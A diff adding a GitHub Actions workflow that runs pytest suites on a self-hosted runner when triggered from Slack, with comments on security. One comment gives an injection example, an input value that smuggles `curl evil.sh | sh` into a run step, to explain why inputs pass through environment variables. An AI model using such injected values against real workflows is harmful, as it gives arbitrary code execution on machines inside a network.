@@ -1,0 +1,112 @@
+name: runtests
+run-name: runtests ${{ inputs.product }} @ ${{ inputs.server }} (${{ inputs.correlation_id }})
+
+# V2 ONLY. The API never runs a test; it dispatches this, and a self-hosted
+# runner picks it up by POLLING GitHub — so the machine on your network needs no
+# inbound connectivity and no open port.
+
+on:
+  workflow_dispatch:
+    inputs:
+      correlation_id: { required: true,  type: string }
+      product:        { required: true,  type: string }
+      server:         { required: true,  type: string }
+      select:         { required: false, type: string }
+      marker:         { required: false, type: string }
+      slack_channel:  { required: true,  type: string }
+      slack_user:     { required: true,  type: string }
+
+# A slash command is a free trigger for an expensive job. Cap it.
+concurrency:
+  group: runtests-${{ inputs.product }}-${{ inputs.server }}
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+
+jobs:
+  run:
+    # A self-hosted runner must NEVER be attached to a public repo: a pull
+    # request from a fork can run arbitrary code on it. Prefer ephemeral
+    # (just-in-time) runners so nothing carries between jobs.
+    runs-on: [self-hosted, linux, testlab]
+    timeout-minutes: 30
+
+    env:
+      # ─────────────────────────────────────────────────────────────────────
+      # THIS BLOCK IS A SECURITY CONTROL, NOT TIDINESS.
+      #
+      # GitHub substitutes ${{ ... }} into the script TEXTUALLY, before any
+      # shell sees it. Interpolating an input directly into a `run:` block:
+      #
+      #     run: pytest -k ${{ inputs.select }}
+      #
+      # with a value of:  smoke"; curl evil.sh | sh; "
+      # is arbitrary code execution on a machine inside your network.
+      #
+      # Routing through env: means the value arrives as data the shell already
+      # holds, and is never parsed as script. The regex in parsing.py is the
+      # second lock on the same door; keep both.
+      # ─────────────────────────────────────────────────────────────────────
+      PRODUCT: ${{ inputs.product }}
+      SERVER: ${{ inputs.server }}
+      SELECT: ${{ inputs.select }}
+      MARKER: ${{ inputs.marker }}
+      CORRELATION_ID: ${{ inputs.correlation_id }}
+      SLACK_CHANNEL: ${{ inputs.slack_channel }}
+      SLACK_USER: ${{ inputs.slack_user }}
+      SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install uv
+        uses: astral-sh/setup-uv@v5
+
+      - run: uv sync --frozen
+
+      # The runner introduces itself. This is the ONLY place that knows the run
+      # id — workflow_dispatch answers 204 with no id, so the API could never
+      # tell the user where their run went. See runners/github.py.
+      - name: Announce the run
+        run: |
+          uv run python -c "
+          import os
+          from slack_runtests.slack import notify
+          url = f\"{os.environ['GITHUB_SERVER_URL']}/{os.environ['GITHUB_REPOSITORY']}/actions/runs/{os.environ['GITHUB_RUN_ID']}\"
+          notify(f\"Starting {os.environ['PRODUCT']} on {os.environ['SERVER']} — <{url}|run log>\")
+          "
+
+      - name: Run the suite
+        run: |
+          uv run pytest "tests/sample/$PRODUCT" \
+            --server="$SERVER" \
+            ${SELECT:+-k "$SELECT"} \
+            ${MARKER:+-m "$MARKER"} \
+            --junit-xml=results.xml
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: results-${{ inputs.correlation_id }}
+          path: results.xml
+
+      # The Slack message is a summary; the artifact is the report. Never paste
+      # a suite's output into a channel.
+      - name: Report the outcome
+        if: always()
+        run: |
+          uv run python -c "
+          import os, xml.etree.ElementTree as ET
+          from slack_runtests.slack import SlackNotifier
+          s = SlackNotifier()
+          try:
+              r = ET.parse('results.xml').getroot()
+              suite = r if r.tag == 'testsuite' else r.find('testsuite')
+              total = int(suite.get('tests', 0)); failed = int(suite.get('failures', 0)) + int(suite.get('errors', 0))
+              skipped = int(suite.get('skipped', 0))
+              s.finish(passed=total - failed - skipped, failed=failed, skipped=skipped,
+                       duration=float(suite.get('time', 0)))
+          except Exception as exc:
+              s.post(f'Run {os.environ[\"CORRELATION_ID\"]} finished but the report could not be read: {exc}')
+          "
